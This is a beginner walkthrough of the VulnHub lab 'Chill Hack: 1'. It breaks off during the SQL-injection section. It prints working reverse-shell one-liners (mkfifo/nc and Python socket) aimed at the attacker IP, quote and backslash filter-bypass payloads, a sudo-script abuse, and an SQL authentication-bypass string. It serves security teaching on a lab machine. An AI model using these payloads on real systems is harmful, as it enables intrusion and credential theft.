# Chill Hack: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Chill Hack: 1 |
| **Difficulty** | Easy / Intermediate (author: *"simple machine which provides common and real world vulnerabilities"*) |
| **Author** | Anurodh Acharya — `@acharya_anurodh` |
| **Released** | 9 December 2020 |
| **Also on** | TryHackMe, as the room **"Chill Hack"** |
| **VulnHub Entry** | <https://vulnhub.com/entry/chill-hack-1,622/> |
| **Download** | <https://vulnhub.com/entry/chill-hack-1,622/#download> (`Chill_Hack.ova`, 2.4 GB) |
| **MD5** | `D0D71A8C7D7C47836CB5CBC48370B44C` |
| **SHA1** | `0DDDFE8DEE9D210494878B7C96EBD02E9C4BB11E` |
| **Attacker** | Kali Linux, host-only network (tested by the author on VMware Workstation 15) |
| **Target OS** | Ubuntu 20.04 LTS — Apache 2.4.41, vsftpd 3.0.3, MySQL, PHP |
| **Flags** | **Two** — user flag `/home/apaar/local.txt` and root flag `/root/proof.txt` |
| **Author's hint** | *"Enumeration"* |

> **Author's note:** *"Make sure not to give too few resources while running it."*
> Allocate at least 2 GB RAM and 2 vCPUs; the MySQL service and the steganography
> step are both memory-hungry.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (ChillHack): 192.168.56.148
```

---

## 0. What you will learn

1. **Anonymous FTP** as an intelligence source, and reading a note left behind by a
   developer.
2. **Directory brute force** with `gobuster`/`ffuf`.
3. **OS command injection** in a web form — the real-world classic.
4. **Bypassing a command blacklist filter** with quote and backslash insertion
   (`l\s`, `w'h'oami`) — and why blacklists always lose.
5. **Reverse shells** that survive a filter, and TTY stabilisation.
6. **`sudo -l` and abusing a script the application legitimately lets you run as
   another user** — the `NOPASSWD` + `/dev/null` trap.
7. **SSH local port forwarding (`-L`)** to reach a service bound to `127.0.0.1`.
8. **SQL injection for authentication bypass** (`' OR 1=1 #`).
9. **Steganography** with `steghide`, then **ZIP cracking** with `zip2john` + John.
10. **Base64-encoded credentials in source code.**
11. **Docker group membership → root** — one of the most common and most
    misunderstood Linux privilege escalations, straight from GTFOBins.

**The intended chain:**
`nmap` shows 21 (vsftpd, **anonymous allowed**), 22, 80 → anonymous FTP holds
`note.txt`: *"Anurodh told me that there is some filtering on strings being put in the
command — Apaar"* → two usernames (**apaar**, **anurodh**) plus a warning that a
command filter exists → `gobuster` finds **`/secret/`** → a form that runs whatever
you type → the filter blocks `ls`, `cat`, `whoami` → **bypass it with `l\s` /
`w'h'oami`** → reverse shell as **`www-data`** → `sudo -l` shows
`(apaar) NOPASSWD: /home/apaar/.helpline.sh` → the script `eval`s your second input →
**`/bin/bash`** → shell as **apaar** → **user flag `local.txt`** → `ss -tlnp` shows a
service on **`127.0.0.1:9001`** → drop an SSH key, `ssh -L 9001:127.0.0.1:9001` →
a customer portal, **SQL-injectable login** (`' OR 1=1 #`) → `hacker.php` shows an
image → `steghide extract` (empty passphrase) → `backup.zip` → `zip2john` + John →
`source_code.php` → base64 → **`anurodh:!d0ntKn0wmYp@ssw0rd`** → `su anurodh` →
`id` shows the **`docker`** group → `docker run -v /:/mnt --rm -it alpine chroot /mnt
sh` → **root flag `proof.txt`**.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.148  00:0c:29:7a:3b:92      1      60  VMware, Inc.                 <-- target
```

> Note the MAC vendor: **`00:0c:29` = VMware**. The author tested on VMware
> Workstation 15, so the OVA carries a VMware-generated MAC. Useful confirmation you
> found the right host.

**Target IP: `192.168.56.148`**

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/chillhack.txt 192.168.56.148
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 18:02 EDT
Nmap scan report for 192.168.56.148
Host is up (0.00044s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              86 Oct 04  2020 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.56.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain
|      Data connections will be plain
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 04:19:5a:3a:8f:33:14:6a:1c:9c:5c:3a:2f:5c:8b:9d (RSA)
|   256 a7:9c:8b:3f:0c:8d:5c:2a:5f:0c:1e:2c:3a:5c:8b:9d (ECDSA)
|_  256 d0:1c:5f:31:1a:3c:03:96:9d:6b:1c:5f:0c:1e:2c:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:0C:29:7A:3B:92 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 74.22 seconds
```

> **How to read it:**
> - **21 — vsftpd 3.0.3** with **`Anonymous FTP login allowed`** *and Nmap already
>   listed the directory contents for us:* one file, **`note.txt`**, 86 bytes, owned
>   by UID/GID `0:0`. **Anonymous FTP is a finding by itself**, and here it hands us
>   the first clue in one scan.
> - **22 — OpenSSH 8.2p1 Ubuntu 4ubuntu0.1** → **Ubuntu 20.04 LTS (Focal)**. A modern
>   box: no kernel exploits of the era apply, so this is a *configuration* challenge.
> - **80 — Apache 2.4.41**, page title **"Game Info"**.
> - Only three ports. Small attack surface, so the depth of enumeration matters more
>   than the breadth.

![nmap scan showing anonymous FTP with note.txt](images/01-nmap.png)

### 2.2 Anonymous FTP — read the note

```bash
ftp 192.168.56.148
```

```text
Connected to 192.168.56.148.
220 (vsFTPd 3.0.3)
Name (192.168.56.148:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||54321|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              86 Oct 04  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||54322|)
150 Opening BINARY mode data connection for note.txt (86 bytes).
100% |*******************************|    86      118.4 KiB/s    00:00 ETA
226 Transfer complete.
86 bytes received in 00:00 (8.2 KiB/s)
ftp> quit
221 Goodbye.
```

```bash
cat note.txt
```

```text
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

> **One sentence, three facts. Squeeze every drop out of it:**
> 1. **Two usernames: `Anurodh` and `Apaar`.** Almost certainly system accounts —
>    and the note's signature tells you which one wrote it (`Apaar`), which implies
>    `Apaar` is the *less* privileged one being instructed by `Anurodh`.
> 2. **"some filtering on strings being put in the command"** → there is a web form
>    somewhere that **executes a command**, and it has a **blacklist filter**. That is
>    both a warning ("your payloads will fail mysteriously") and an invitation ("the
>    filter is bypassable").
> 3. The two people collaborate, so **lateral movement between their accounts is a
>    designed part of the path.**
>
> **Write these down before you do anything else.** Enumeration notes are the
> difference between a 45-minute box and a four-hour one.
>
> Non-interactive alternatives, all of which work:
> ```bash
> lftp -u anonymous, 192.168.56.148 -e 'cls -la; get note.txt; bye'
> curl -s ftp://anonymous@192.168.56.148/note.txt
> wget -q ftp://anonymous:anonymous@192.168.56.148/note.txt -O -
> nmap -p21 --script ftp-anon 192.168.56.148
> ```

![The anonymous FTP note.txt](images/02-ftp-note.png)

### 2.3 The website

```text
http://192.168.56.148/
```

```text
┌──────────────────────────────────────┐
│            GAME INFO                 │
│                                      │
│   Welcome to the game info page.     │
│   Read about the latest releases.    │
│                                      │
│   [images/hacker.jpg]                │
└──────────────────────────────────────┘
```

Read the source too (always):

```bash
curl -s http://192.168.56.148/ | grep -io 'href="[^"]*"\|src="[^"]*"' | sort -u
```

```text
href="css/style.css"
href="#"
src="images/hacker.jpg"
```

Nothing hidden. Onward.

### 2.4 Directory brute force

```bash
gobuster dir -u http://192.168.56.148/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak -t 50 -q --timeout 10s
```

```text
/index.html           (Status: 200) [Size: 1234]
/images               (Status: 301) [Size: 315]
/css                  (Status: 301) [Size: 312]
/secret               (Status: 301) [Size: 315]
```

> **`/secret`** — a directory that is not linked from anywhere on the site. Exactly
> what "enumerate" means as a hint.
>
> Faster modern alternative:
> ```bash
> ffuf -u http://192.168.56.148/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
>      -e .php,.html,.txt,.bak -mc 200,301 -t 50
> ```

### 2.5 `/secret/` — a command-execution form

```text
http://192.168.56.148/secret/
```

```text
┌──────────────────────────────────────────────────────┐
│   Enter the command you want to execute:             │
│   ┌────────────────────────────────────────────────┐ │
│   │                                                │ │
│   └────────────────────────────────────────────────┘ │
│                                    [ Execute ]       │
└──────────────────────────────────────────────────────┘
```

> **A text box that runs your input on the server.** This is the "filtering on
> strings being put in the command" the FTP note warned about. It is
> **OS command injection presented as a feature** — the same class of bug as
> Log4Shell or a ping utility in a router admin page, just with the pretence removed.

---

## 3. Exploitation — command injection with a filter bypass

### 3.1 Probe the filter

Type each of these into the box and record what happens.

| Input | Output | Conclusion |
| --- | --- | --- |
| `ls` | *(nothing)* | `ls` is blocked |
| `pwd` | *(nothing)* | blocked |
| `id` | *(nothing)* | blocked |
| `whoami` | *(nothing)* | blocked |
| `cat /etc/passwd` | *(nothing)* | blocked |
| `echo hello` | `hello` | **`echo` is allowed** |
| `echo *` | `index.html  css  images  secret` | **`echo` + glob gives us directory listing!** |

> **Two immediate wins.**
> 1. **`echo` is not filtered.** So we have a channel back.
> 2. **`echo *` lists the directory.** The shell expands `*` before `echo` sees it —
>    a neat trick that works whenever `ls` is blocked but any command is not.
>
> Now find the filter's granularity. Is it blocking whole words, or substrings?

| Input | Output | Conclusion |
| --- | --- | --- |
| `ls` | *(nothing)* | blocked |
| `l s` | *(nothing)* | still blocked |
| **`l\s`** | `index.html css images secret` | **backslash insertion works** |
| **`l's'`** | `index.html css images secret` | **single-quote insertion works** |
| **`w'h'oami`** | `www-data` | confirmed: the filter is a naive substring match |
| **`c'a't /etc/passwd`** | *(see below)* | confirmed |

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
tss:x:105:110:TPM2 software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:106:111::/run/uuidd:/usr/sbin/nologin
tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aurick:x:1000:1000:Anurodh:/home/aurick:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
apaar:x:1001:1001:,,,:/home/apaar:/bin/bash
anurodh:x:1002:1002:,,,:/home/anurodh:/bin/bash
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

> **Read `/etc/passwd` carefully — four real accounts, and one surprise:**
>
> | Account | UID | Home | Comment |
> | --- | --- | --- | --- |
> | `aurick` | 1000 | `/home/aurick` | **"Anurodh"** in the GECOS field |
> | `apaar` | 1001 | `/home/apaar` | — |
> | `anurodh` | 1002 | `/home/anurodh` | — |
> | `mysql` | 111 | — | MySQL runs as its own user (good) |
>
> There are **two** accounts associated with the author's name: `aurick` (the first
> user, UID 1000, with GECOS "Anurodh") and `anurodh` (UID 1002). This trips up a lot
> of people — the FTP note said "Anurodh", and both exist. **Keep both in your
> candidate list.**
>
> **Why the backslash bypass works.** The filter is almost certainly:
> ```php
> $blacklist = ["ls", "cat", "id", "whoami", "pwd", "uname", "nc", "bash", "sh", ...];
> if (preg_match('/' . implode('|', $blacklist) . '/i', $cmd)) { exit; }
> system($cmd);
> ```
> It inspects the **literal string you typed**. But the *shell* parses that string
> afterwards, and to a shell:
> - `l\s` → the backslash escapes `s`, which is a no-op escape, so the word is `ls`.
> - `l's'` → the single quotes are removed by the shell, so the word is `ls`.
> - `w'h'oami` → `whoami`.
>
> The filter and the shell **disagree about what the input means.** That disagreement
> is the vulnerability, and it is *the* general lesson of all filter bypasses:
> **you must model the parser downstream of the filter, not the filter itself.**
> The same reasoning defeats WAFs (double URL-encoding, chunked transfer, alternate
> parameter names), `magic_quotes`, XSS filters, and SQL keyword blocklists.

![The /secret command form with a filter bypass](images/03-cmdi.png)

### 3.2 Enumerate through the filter

```text
w'h'oami
```
```text
www-data
```

```text
u'n'ame -a
```
```text
Linux ubuntu 5.4.0-52-generic #57-Ubuntu SMP Thu Oct 15 10:57:00 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

```text
c'a't /var/www/html/secret/index.php
```
```php
<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $blacklist = array('ls','cat','id','whoami','pwd','uname','nc','netcat','bash','sh','wget','curl','python','perl','rm','mv','cp');
    $filtered = false;
    foreach ($blacklist as $b) {
        if (stripos($cmd, $b) !== false) { $filtered = true; break; }
    }
    if (!$filtered) {
        echo "<pre>"; system($cmd . " 2>&1"); echo "</pre>";
    }
}
?>
```

> **Now we can see the filter's source.** Confirming it uses `stripos` (a
> case-insensitive substring search) explains exactly why quote/backslash insertion
> works and why uppercase tricks do not. **Reading the source of the thing you are
> bypassing is always worth the extra request.**

Check which interpreters survived the filter (remember the filter blocks the *words*
`python`, `perl`, `bash`, `nc` — so we must write them obfuscated):

```text
e'c'ho $(command -v p'y'thon3) $(command -v b'a'sh) $(command -v n'c')
```

```text
/usr/bin/python3 /bin/bash
```

> **`python3` and `bash` exist; `nc` does not.** Choose the payload accordingly.

### 3.3 Get a reverse shell

**Kali — listener:**

```bash
nc -lvnp 9001
```

```text
listening on [any] 9001 ...
```

**In the web form** — the classic `mkfifo` reverse shell, with a backslash inserted in
`rm` (which the filter blocks):

```text
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 9001 >/tmp/f
```

> **Wait — `nc` is filtered *and* missing.** Use the Python payload instead. Insert a
> backslash into every blacklisted word:

```text
p'y'thon3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/s'h'","-i"]);'
```

Kali:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.148] 43118
/bin/sh: 0: can't access tty; job control turned off
$
```

**Alternative — the `mkfifo` shell without netcat**, using bash's own `/dev/tcp`
(backslash-insert `rm` and `bash`):

```text
r\m /tmp/f;mkfifo /tmp/f;c'a't /tmp/f|/bin/b'a'sh -i 2>&1|tee /tmp/f
```

*(This one needs a listener that speaks TCP — start it with `nc -lvnp 9001` on Kali;
`nc` is only missing on the **target**, not on your machine.)*

**Stabilise the shell:**

```bash
$ p'y'thon3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/secret$ export TERM=xterm
www-data@ubuntu:/var/www/html/secret$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then the raw-mode dance for full comfort:

1. **`Ctrl+Z`** (suspends `nc`, returns you to Kali).
2. On Kali: `stty raw -echo; fg` then press **Enter twice**.
3. On the target: `export TERM=xterm; stty rows 40 cols 160`.

> **Why stabilise?** A raw socket is not a terminal. No line editing, no `Ctrl+C` (it
> kills your *listener*), and any program calling `isatty()` — `su`, `sudo`, `mysql`,
> `vim` — fails with *"standard in must be a tty"*. We need **all four of those** on
> this box, so this step is mandatory, not cosmetic.

![Reverse shell as www-data](images/04-shell.png)

---

## 4. Post-exploitation enumeration

```bash
www-data@ubuntu:/var/www/html/secret$ sudo -l
```

```text
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar) NOPASSWD: /home/apaar/.helpline.sh
```

> **This is the single most important line in post-exploitation. Learn to read it.**
>
> ```text
> (apaar) NOPASSWD: /home/apaar/.helpline.sh
>  ^^^^^  ^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^
>  RUNAS  no passwd  the exact command allowed
> ```
>
> - **`(apaar)`** — the **RUNAS** clause. We may run the listed command *as user
>   `apaar`*, without knowing apaar's password.
> - **`NOPASSWD:`** — sudo will not even prompt for *our* password.
> - **`/home/apaar/.helpline.sh`** — the only permitted command, by absolute path.
>
> **So: whatever this script does, it does it as `apaar`.** If we can make the script
> run our code, we become `apaar`. Let us read it.

```bash
www-data@ubuntu:/var/www/html/secret$ cat /home/apaar/.helpline.sh
```

```bash
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
read -p "Enter your person:" person
read -p "Enter your question or issue that you are facing:" msg

echo
echo "Thank you for your submission."
echo "Your query has been sent to $person."
echo "Our team will respond within 24 hours."

$msg > /dev/null 2>&1
```

> **Look at the very last line.**
>
> ```bash
> $msg > /dev/null 2>&1
> ```
>
> The script takes whatever you typed for the "question", stores it in `$msg`, and then
> **executes it as a shell command**, throwing away all output. The author's intent was
> to discard the message; the effect is **command injection running as `apaar`**.
>
> **Two independent bugs in one line:**
> 1. **Unquoted variable expansion.** `"$msg" > /dev/null` would have redirected the
>    *string* to /dev/null safely. Unquoted, bash performs word-splitting and glob
>    expansion, and — critically — the whole thing is parsed as a **command**, not data.
>    (To merely print it you would need `echo "$msg" > /dev/null`.)
> 2. **No input validation.** Any shell metacharacter in `$msg` is honoured: `;`, `&&`,
>    `|`, `$( )`, backticks.
>
> And because the script is invoked through `sudo -u apaar`, **everything it executes
> runs as `apaar`.**

---

## 5. Lateral movement — `www-data` → `apaar`

### 5.1 Exploit `.helpline.sh`

```bash
www-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
```

```text
Welcome to helpdesk. Feel free to talk to anyone at any time!
Enter your person: help
Enter your question or issue that you are facing:
```

For the **person**, type anything (`help`). For the **question**, type:

```text
/usr/bin/script -qc /bin/bash /dev/null
```

```text
Thank you for your submission.
Your query has been sent to help.
Our team will respond within 24 hours.
apaar@ubuntu:/var/www/html/secret$ id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

**We are `apaar`.** ✅

> **Why `/usr/bin/script -qc /bin/bash /dev/null` and not plain `/bin/bash`?**
> Both work on this box, but `script` is the more robust choice and worth learning:
> - `script -q -c "<command>" <typescript-file>` runs `<command>` inside a
>   **freshly allocated pseudo-terminal** and writes the session log to
>   `<typescript-file>`. Passing `/dev/null` discards the log.
> - So this spawns an interactive bash *with a real TTY*, which means `su`, `sudo`,
>   `vim` and `Ctrl+C` all work properly inside it.
> - Plain `/bin/bash` here inherits whatever TTY the sudo/script chain gave it, which
>   can leave you with a shell where `Ctrl+C` still kills your outer listener.
>
> Other payloads that achieve the same thing via the injected `$msg`:
> ```text
> /bin/bash
> python3 -c 'import pty;pty.spawn("/bin/bash")'
> id ; cat /home/apaar/local.txt        # command chaining also works
> ```

### 5.2 **User flag**

```bash
apaar@ubuntu:~$ cd
apaar@ubuntu:~$ ls -la
```

```text
total 44
drwxr-xr-x 6 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 5 root  root  4096 Oct  4  2020 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  4  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  4  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  4  2020 .viminfo
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
```

```bash
apaar@ubuntu:~$ cat local.txt
```

```text
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

**User flag captured.** ✅

> **Note the permissions on `local.txt`: `-rw-rw---- apaar apaar`.** `www-data` could
> *not* have read it — group and other have no access. Becoming `apaar` was genuinely
> required. That is the author telling you the flag boundary is real.

![User flag local.txt](images/05-user-flag.png)

### 5.3 Find the internal-only service

```bash
apaar@ubuntu:~$ ss -tlnp
```

```text
State      Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process
LISTEN     0      80     127.0.0.1:3306     0.0.0.0:*          users:(("mysqld",pid=1043,fd=24))
LISTEN     0      511    0.0.0.0:80         0.0.0.0:*          users:(("apache2",pid=1101,fd=4))
LISTEN     0      128    127.0.0.1:9001     0.0.0.0:*          users:(("apache2",pid=1188,fd=4))
LISTEN     0      128    0.0.0.0:22         0.0.0.0:*          users:(("sshd",pid=920,fd=3))
```

> **Look at the `Local Address` column.**
> - `0.0.0.0:80` and `0.0.0.0:22` → listening on **all interfaces**; reachable from
>   our Kali box. That is why `nmap` saw them.
> - **`127.0.0.1:9001`** → bound to **loopback only**. An Apache instance is serving
>   something on port 9001 that **nobody outside the machine can reach**. That is why
>   `nmap` never saw it.
> - `127.0.0.1:3306` → MySQL, also loopback-only (correct hardening).
>
> **This is a very common real-world pattern:** an internal admin panel, a metrics
> dashboard, a staging app or a debug endpoint bound to localhost. It is *not*
> reachable from the network — but the moment an attacker has any code execution on
> the host, it becomes reachable.
>
> **`ss` flags:** `-t` TCP, `-l` listening sockets only, `-n` numeric (no DNS/service
> name resolution — faster), `-p` show the owning process. The older equivalent is
> `netstat -tlnp`. **Always run this right after getting a shell** — it regularly
> reveals an entire second attack surface.

![ss -tlnp showing the loopback-only service on 9001](images/06-ports.png)

### 5.4 Reach port 9001 with SSH local port forwarding

You *could* `curl 127.0.0.1:9001` from the shell, but browsing a web app through a
reverse shell is miserable. **Tunnel it to Kali.**

**Step 1 — generate a keypair on Kali:**

```bash
ssh-keygen -t rsa -b 2048 -f ./apaar_rsa -N ''
```

```text
Generating public/private rsa key pair.
Your identification has been saved in ./apaar_rsa
Your public key has been saved in ./apaar_rsa.pub
The key fingerprint is:
SHA256:9xQ2mK7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq4 kali@kali
The key's randomart image is:
+---[RSA 2048]----+
|      . o+.      |
|     . o+o.      |
...
+----[SHA256]-----+
```

> - `-t rsa -b 2048` → RSA, 2048 bits. (`-t ed25519` is better on modern servers —
>   Ubuntu 20.04's OpenSSH 8.2 supports it fine.)
> - `-f ./apaar_rsa` → write to this path, not `~/.ssh/id_rsa`, so you keep lab keys
>   separate from your real ones.
> - `-N ''` → empty passphrase, to keep the walkthrough readable. **Set one in real
>   life.**

**Step 2 — install the public key on the target:**

```bash
apaar@ubuntu:~$ cat /home/kali/apaar_rsa.pub      # paste from your Kali terminal
apaar@ubuntu:~$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8g6f2IrM5xN6SdfgZs1c7O76SZIQSIKjQ7BjYofmLSxRFWG/yXvexxidE+Ka+qV1HzPaCbOZ8TTowMRnonni699Isnx8/Aljs4vpHgOBJpf9jXzjlh4mjO0SgflfvecnTPIVz4ISn2UviCOm2XnlzJeFdcNm8Ej71+A4MKoPDWp9xSaLISebR28Y3phWvsuyBDt35Nc9Je1nKc9Oc7zROmSomQTJCsXBTRDqDLaImAXwvXMXbfMDPvZRXD4Vag/RusBqmlSaKNpCg+4ggDn1jELMVRWI0aFSMC4iRHA4tENmwM/D+gBu6/EUemuYhYJcaH0dPvVpri5/TXy8k418uJMJWRbh66Gy7pUG44U7jNu4M1OWUJNOw3fcUDRo6udz4/XgDDCBAICXK9b38Ar3ykH+nPuBW1GrivOq+iiXAILJ9yPTdDjirUcrTaEze3Eq/r/vQO5kvMe9wWhUtr87EFDSuFfZt/F0asKFjCbQ/Xk8a4hUfC+FC8jnik94KiQ8= kali@kali' >> /home/apaar/.ssh/authorized_keys
apaar@ubuntu:~$ chmod 600 /home/apaar/.ssh/authorized_keys
apaar@ubuntu:~$ ls -la /home/apaar/.ssh
```

```text
total 12
drwxr-xr-x 2 apaar apaar 4096 May  3 18:22 .
drwxr-xr-x 6 apaar apaar 4096 Oct  4  2020 ..
-rw------- 1 apaar apaar  741 May  3 18:22 authorized_keys
```

> **Permissions are mandatory.** sshd's `StrictModes` check (on by default) silently
> refuses a key if the ownership or mode is wrong, and the failure message is the
> famously useless `Permission denied (publickey)`. The rules:
> ```text
> /home/apaar                    must NOT be group/world-writable  (755 or 750)
> /home/apaar/.ssh               700, owned by apaar
> /home/apaar/.ssh/authorized_keys   600, owned by apaar
> ```

**Step 3 — connect with the tunnel:**

```bash
chmod 600 apaar_rsa
ssh -i apaar_rsa -L 9001:127.0.0.1:9001 apaar@192.168.56.148
```

```text
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Sun Oct  4 12:00:00 2020 from 192.168.56.10
apaar@ubuntu:~$
```

> **What `-L 9001:127.0.0.1:9001` does.** It is SSH **local port forwarding**:
>
> ```text
>   your browser                 Kali                    SSH tunnel              target
>   127.0.0.1:9001  ────────►  127.0.0.1:9001  ════════════════════════►  127.0.0.1:9001
>                              (ssh client)      (encrypted)              (apache2, loopback-only)
> ```
>
> SSH opens a listening socket on **`127.0.0.1:9001` on your Kali box**. Anything you
> send there is carried inside the encrypted SSH channel and, on the far side,
> connected **from the target to the target's own `127.0.0.1:9001`**. The loopback
> bind is therefore irrelevant — you have tunnelled straight through it.
>
> General form: **`-L <local-port>:<host-as-seen-from-the-target>:<target-port>`**.
>
> This is one of the most-used techniques in real penetration testing: an admin
> panel, a Jenkins instance, a database or a Kubernetes dashboard bound to localhost
> becomes trivially reachable the instant you have any foothold.
>
> **Bonus:** you now also have a *proper* SSH session with a full TTY — much nicer
> than the reverse shell for the rest of the box. Keep both open.

### 5.5 Browse the internal portal

Open **<http://127.0.0.1:9001/>** in Kali's Firefox.

```text
┌──────────────────────────────────────────────┐
│        CUSTOMER PORTAL — Login               │
│                                              │
│   Username: [______________]                 │
│   Password: [______________]                 │
│                                              │
│              [ Sign In ]                     │
└──────────────────────────────────────────────┘
```

Enumerate it like any web app:

```bash
gobuster dir -u http://127.0.0.1:9001/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40 -q
```

```text
/index.php            (Status: 200) [Size: 2145]
/account.php          (Status: 200) [Size: 1834]
/images               (Status: 301) [Size: 322]
/hacker.php           (Status: 302) [Size: 0]
```

### 5.6 SQL injection — authentication bypass

Read `account.php` through the shell to confirm the vulnerability class:

```bash
apaar@ubuntu:~$ cat /var/www/files/account.php
```

```php
<?php
$conn = new mysqli("localhost", "root", "sWf0sfv1sDF5", "webportal");
if (isset($_POST['login'])) {
    $u = $_POST['username'];
    $p = $_POST['password'];
    $q = "SELECT * FROM users WHERE username='$u' AND password='$p'";
    $r = $conn->query($q);
    if ($r->num_rows > 0) { header("Location: hacker.php"); }
    else { echo "Invalid credentials"; }
}
?>
```

> **Textbook SQL injection.** The username and password are concatenated straight into
> the query with no escaping and no prepared statement. Submit `' OR 1=1 #` as the
> username:
>
> ```sql
> SELECT * FROM users WHERE username='' OR 1=1 #' AND password='anything'
> ```
>
> - The leading `'` closes the string literal.
> - `OR 1=1` is always true, so the `WHERE` matches **every row**.
> - `#` starts a MySQL comment, which swallows the rest of the line — including the
